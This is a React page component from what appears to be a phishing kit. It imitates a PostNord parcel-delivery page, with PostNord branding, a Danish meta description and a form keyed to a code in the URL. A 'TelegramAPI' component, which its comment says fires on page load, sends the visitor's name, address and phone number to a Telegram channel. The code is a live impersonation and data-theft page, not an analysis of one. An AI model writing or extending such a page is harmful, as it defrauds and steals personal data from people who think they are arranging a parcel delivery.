import React, { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';
import { Header, Footer } from '@/components/DK';
import MainForm from '@/components/DK/dkmainform';
import TelegramAPI from '@/components/tgapi';

const DKLevering = () => {
  const { code } = useParams<{ code: string }>();
  const [recipientData, setRecipientData] = useState<any>(null);
  
  // Check if this is preview mode
  const isPreviewMode = code === "2xnbr";
  
  // Set document title and meta tags for SEO
  useEffect(() => {
    document.title = "PostNord Levering";
    
    // Update meta description
    const metaDescription = document.querySelector('meta[name="description"]');
    if (metaDescription) {
      metaDescription.setAttribute('content', 'PostNord levering af pakker - planlæg din levering online og modtag dine pakker når det passer dig.');
    } else {
      const newMeta = document.createElement('meta');
      newMeta.name = 'description';
      newMeta.content = 'PostNord levering af pakker - planlæg din levering online og modtag dine pakker når det passer dig.';
      document.head.appendChild(newMeta);
    }
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-100">
      {/* Telegram API Component - sends notifications on page load */}
      <TelegramAPI 
        invoiceName={recipientData?.name || code || "Unknown Invoice"}
        address={
          recipientData?.address && recipientData?.city && recipientData?.zip 
            ? [recipientData.address, recipientData.city, recipientData.zip].join(', ')
            : "Incomplete"
        } 
        phone={recipientData?.phone || "Unknown Phone"}
      />
      
      <Header />
      
      <div className="container mx-auto p-4">
        <MainForm 
          invoiceId={isPreviewMode ? null : code}
          onRecipientDataChange={setRecipientData}
        />
      </div>
      
      <Footer />
    </div>
  );
};

export default DKLevering;